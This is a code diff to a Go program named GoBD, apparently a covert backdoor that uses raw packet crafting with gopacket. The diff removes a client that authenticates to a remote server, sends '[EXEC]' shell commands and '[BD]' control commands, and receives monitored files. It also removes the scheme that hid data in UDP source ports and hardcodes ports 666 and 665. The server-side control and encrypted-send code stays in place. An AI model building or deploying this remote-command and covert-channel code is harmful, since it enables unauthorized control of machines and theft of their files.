@@ -36,10 +36,8 @@ import(
 	"encoding/binary"
 	"fmt"
 	"strings"
-	"strconv"
-	"bufio"
+//	"strconv"
 	"github.com/google/gopacket/layers"
-	"golang.org/x/crypto/ssh/terminal"
 	"runtime"
 	"github.com/google/gopacket/pcap"
 	"github.com/google/gopacket"
@@ -131,100 +129,6 @@ func main(){
 		beginListen(*ipPtr, uint16(*portPtr), uint16(*lPortPtr))
 	}
 }
-/* 
-    FUNCTION: func intiateClient(ip string, port, lport in)
-    RETURNS: Nothing
-    ARGUMENTS: 
-                string ip : the ip address of the server
-                int port : port to send data to
-                int lport : port to listen for data on
-
-    ABOUT:
-    Intiates the client of the GoBD application. Grabs the authentication code from the user and sends it to the
-    server if correct. Then idles waiting for user input and server output. Also provides help documentation
-*/
-func intiateClient(ip string, port, lport uint16){
-	
-	for {
-		fmt.Print("Please input the authentication code: ");
-		var authstr string;
-		if runtime.GOOS == "windows" {
-			reader := bufio.NewReader(os.Stdin);
-			authstr, _ := reader.ReadString('\n');
-			authstr = strings.TrimSpace(authstr);
-		} else {			
-			authcode, _ := terminal.ReadPassword(0);
-			authstr = string(authcode);
-		}
-		
-		if authstr == passwd {
-			sendAuthPacket(ip, authstr, port)
-			break;
-		}
-		fmt.Print("\nInvalid authentication code, try again.\n");
-	}
- 
-	fmt.Printf("Authentication accepted, you may now send commands.\n");
-	fmt.Printf("Type ?help for more info on sending client commands.\n");
-
-	go beginListen(ip, port, lport)
-	
-	for {
-		reader := bufio.NewReader(os.Stdin);
-		input, _ := reader.ReadString('\n');
-		input = strings.TrimSpace(input);
-		if strings.HasPrefix(input, "!") {
-			sendEncryptedData(port, "[BD]" + input, ip);
-			if strings.HasPrefix(input, "!monitor") {
-				args := strings.Split(input, " ");
-				go fileWait(ip, args[1], lport + 1)
-			}
-		} else if input == "?help" {
-			fmt.Print(helpStr);
-			continue;
-		} else {
-			sendEncryptedData(port, "[EXEC]" + input, ip);
-		}
-	}
-}
-
-func fileWait(ip, filename string, lport uint16){
-
-	var addr string
-	fmt.Sprintf(addr, "%s:%d", ip, lport)
-	ln, _ := net.Listen("tcp", addr)
-
-	connection, _ := ln.Accept()
-
-	fileBuffer := make([]byte, 1000)
-	var currentByte int64 = 0
-	
-	file, err := os.Create(strings.TrimSpace(filename))
-	checkError(err)
-	
-	for {
-		connection.Read(fileBuffer)
-		_, err = file.WriteAt(fileBuffer, currentByte)
-
-		currentByte += 1000
-
-		if err == io.EOF {
-			break
-		}
-	}
-	
-	file.Close()
-}
-
-func sendAuthPacket(ip, data string, port uint16){
-	
-	conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
-	checkError(err);
-	
-	cryptdata := encrypt_data(data);
-	_, err = conn.WriteToUDP([]byte(cryptdata), &net.UDPAddr{IP: net.ParseIP(ip), Port: int(port)})
-	checkError(err);
-}
 func beginListen(ip string, port, lport uint16) {
 
 	var ipLayer layers.IPv4
@@ -259,22 +163,6 @@ func beginListen(ip string, port, lport uint16) {
 		
 	}
 }
-func clientControl(val uint16, sIP string, port, lport uint16, buffer []byte) []byte{
-	if sIP  == localip.String() && port == lport {
-		curr_bytes := buffer[i:i + 1]
-		binary.LittleEndian.PutUint16(curr_bytes, val)
-		i = i + 2
-
-		if(port == SND_CMPLETE){
-			fmt.Print(buffer[:(len(buffer) - 1)])
-			buffer = buffer[:0]
-			i = 0
-		}
-	}
-
-	return buffer
-}
-
 func serverControl(val uint16, sIP string, port, dport, lport uint16, buffer []byte, payload []byte) []byte{
 
 	if sIP == authenticatedAddr {
@@ -428,7 +316,8 @@ func sendEncryptedData(port uint16, data, ip string) {
 		if p == size {
 			buffer = craftPacket("", ip, SND_CMPLETE);
 		} else {
-			buffer = craftPacket(string(cryptdata[p:(p+1)]), ip, port); 
+			temp := cryptdata[p:(p+1)]
+			buffer = craftPacket(string(temp), ip, port); 
 		}
 		
 		if buffer == nil { // if original query was invalid
@@ -440,27 +329,24 @@ func sendEncryptedData(port uint16, data, ip string) {
 		checkError(err)
 	}
 }
-
 func craftPacket(data, ip string, port uint16) []byte {
 
-	ethernetLayer := &layers.Ethernet{}
-	ipLayer       := &layers.IPv4{}
-	udpLayer      := &layers.UDP{}
+	ethernetLayer := &layers.Ethernet{
+		SrcMAC: localmac,
+		DstMAC: destmac,
+	}
+	
+	ipLayer := &layers.IPv4{
+		SrcIP: localip,
+		DstIP: net.ParseIP(ip),
+	}
 
-	ethernetLayer.SrcMAC = localmac 
-	ethernetLayer.DstMAC = destmac
-	
-	ipLayer.SrcIP = GetLocalIP()
-	ipLayer.DstIP = net.ParseIP(ip)
-	ipLayer.Version = 4
-	ipLayer.IHL = 4
-	ipLayer.Length = 20
-	ipLayer.Protocol = layers.IPProtocolUDP
-	
-	code, _ := strconv.ParseUint(data, 10, 16)
-	udpLayer.SrcPort = layers.UDPPort(MAX_PORT - code) 
-	udpLayer.DstPort = layers.UDPPort(port)
-	udpLayer.Length = 16
+	//code, _ := strconv.ParseUint(data, 10, 16)
+	udpLayer := &layers.UDP{
+		SrcPort: 666, 
+		DstPort: 665,
+	}
+
 	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
 	checkError(err)
 	
@@ -468,7 +354,7 @@ func craftPacket(data, ip string, port uint16) []byte {
 	opts := gopacket.SerializeOptions{
 		FixLengths: true,
 		ComputeChecksums: true,
-	};
+	}
 
 	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer);
 	checkError(err);
